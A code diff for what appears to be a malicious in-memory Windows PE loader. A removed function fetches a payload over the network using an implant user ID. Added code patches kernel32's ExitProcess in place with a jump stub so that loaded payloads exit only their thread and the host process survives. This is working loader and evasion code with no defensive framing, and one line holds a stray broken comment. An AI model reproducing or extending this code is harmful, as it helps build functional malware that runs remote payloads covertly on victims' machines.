@@ -12,51 +12,6 @@
 
 
 
-LdrInfo LdrPullFile() {
-	LdrInfo info;
-	ParserWrite *writer = ParserInitWrite();
-	if(!writer) {
-		info.ok = FALSE;
-		return info;
-	}
-
-	if(!NwLoadApis()) {
-		info.ok = FALSE;
-		return info;
-	}
-
-	if(!ParserWrite4(writer, 0xab)) {
-		info.ok = FALSE;
-		return info;
-	}
-	INT BytesWrote = ParserWriteBytes(writer, ldr->config->UserId, sizeof(ldr->config->UserId));
-	if(BytesWrote == 0) {
-		info.ok = FALSE;
-		return info;
-	}
-#ifdef LOAD_AND_EXIT
-	BytesWrote = ParserWriteBytes(writer, ldr->config->FileId, sizeof(ldr->config->FileId));
-	if(BytesWrote == 0) {
-		info.ok = FALSE;
-		return info;
-	}
-#endif
-
-	DWORD payloadSize = 0;
-	PVOID payload = NwGetPayload(&payloadSize,
-    ParserWriteReturnPointer(writer),
-    (DWORD)ParserWriteReturnSize(writer));
-	if(!payload) {
-		info.ok = FALSE;
-		return info;
-	}
-
-	info.DataPointer = (PBYTE)payload;
-	info.DataSize = payloadSize;
-	info.ok = TRUE;
-	ParserClearWrite(writer);
-	return info;
-}
 
 BOOL HasReloc(PBYTE pe) {
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe + ((PIMAGE_DOS_HEADER)pe)->e_lfanew);
@@ -166,39 +121,43 @@ void LdrSetSectionPerms(PVOID Base, PIMAGE_SECTION_HEADER sec, WORD numSections)
 }
 
 
-void LdrPatchExitProcess(PVOID Base) {
-    DBGA("[+] Patching ExitProcess\n");
-    PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Base)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-    if (!importDir->VirtualAddress)
+#ifdef LOAD_AND_LISTEN
+void LdrPatchExitProcess(void) {
+    if (ldr->ExitProcessPatched)
         return;
 
-    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, Base, importDir->VirtualAddress);
+    DBGA("[+] Patching ExitProcess\n");
 
-    for (; pImportDesc->Name != 0; ++pImportDesc) {
-        PIMAGE_THUNK_DATA OrgTd  = RVA2VA(PIMAGE_THUNK_DATA, Base, pImportDesc->OriginalFirstThunk);
-        PIMAGE_THUNK_DATA FirstTd = RVA2VA(PIMAGE_THUNK_DATA, Base, pImportDesc->FirstThunk);
-
-        for (; OrgTd->u1.AddressOfData != 0; ++OrgTd, ++FirstTd) {
-            if (IMAGE_SNAP_BY_ORDINAL(OrgTd->u1.Ordinal))
-                continue;
-
-            PIMAGE_IMPORT_BY_NAME pName = RVA2VA(PIMAGE_IMPORT_BY_NAME, Base, OrgTd->u1.AddressOfData);
-
-            /
-            CHAR target[] = { 'E','x','i','t','P','r','o','c','e','s','s', 0 };
-            if (LdrStrncmp(pName->Name, target, 12) == 0) {
-                DBGA("[*] Found ExitProcess\n");
-                FirstTd->u1.Function = (ULONG_PTR)ldr->win32->RtlExitUserThread;
-                return;
-            }
-            DBGA("[!] Failed Finding ExitProcess\n");
-
-        }
+    FARPROC pExit = ldr->win32->GetProcAddress(ldr->modules->kernel32, "ExitProcess");
+    if (!pExit) {
+        DBGA("[!] Failed Finding ExitProcess\n");
+        return;
     }
+
+    PVOID addr = (PVOID)pExit;
+    SIZE_T size = 16;
+    ULONG old = 0;
+    if (!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &addr, &size, PAGE_EXECUTE_READWRITE, &old))) {
+        DBGA("[!] Failed protecting ExitProcess\n");
+        return;
+    }
+
+    // mov rax, imm64 ; jmp rax
+    BYTE stub[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
+    *(ULONG_PTR *)(stub + 2) = (ULONG_PTR)ldr->win32->RtlExitUserThread;
+    LdrMemcpy((PVOID)pExit, stub, sizeof(stub));
+
+    addr = (PVOID)pExit;
+    size = 16;
+    ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &addr, &size, old, &old);
+
+    ldr->win32->NtFlushInstructionCache(CurrentProcess(), NULL, 0);
+    ldr->ExitProcessPatched = TRUE;
+    DBGA("[*] ExitProcess hooked -> RtlExitUserThread\n");
 }
 
 static VOID CALLBACK MemRunCallback(PVOID param, BOOLEAN timedOut) {
-    MemRunContext *ctx = (MemRunContext *)param;
+    LdrMemContext *ctx = (LdrMemContext *)param;
     PVOID Base = ctx->BaseAddress;
 
     PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(Base)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
@@ -216,3 +175,4 @@ static VOID CALLBACK MemRunCallback(PVOID param, BOOLEAN timedOut) {
     ldr->win32->NtFreeVirtualMemory(CurrentProcess(), &ctx->BaseAddress, &size, MEM_RELEASE);
     ldr->win32->LocalFree(ctx);
 }
+#endif
